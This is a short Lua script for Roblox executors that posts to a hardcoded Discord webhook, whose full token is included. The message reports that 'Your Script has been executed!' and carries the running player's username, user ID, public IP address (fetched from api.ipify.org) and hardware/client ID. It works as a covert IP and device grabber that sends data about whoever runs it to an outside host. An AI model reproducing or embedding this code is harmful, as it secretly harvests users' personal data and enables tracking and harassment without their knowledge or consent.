HttpService = game:GetService("HttpService")
Webhook_URL = "https://discord.com/api/webhooks/1091457066796863529/wMiwi2_5GJAf5UIdwOYF09MT1RSxZV7R9LmcxPMsZhBaJtaLRtFK5EISU4P3PztCwv5-"

local response = request({
    Url = Webhook_URL,
    Method = "POST", 
    Headers = {
		['Content-Type'] = 'application/json'
	},
    Body = HttpService:JSONEncode({
		['content'] = "",
		['embeds'] = {{
			["title"] = "**Your Script has been executed!**",
			["description"] = "Stage : ** Authenticated **",
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["fields"] = {
				{
					["name"] = "**Info**",
					["value"] = "**Roblox Username : **"..game.Players.LocalPlayer.Name.."\n".."**Roblox User ID : **"..game.Players.LocalPlayer.UserId.."\n".."**IP Address : **"..game:HttpGet("http://api.ipify.org").."\n".."**Hardware ID : **"..game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true
				}
			}
		
		}}
	}
	)
})
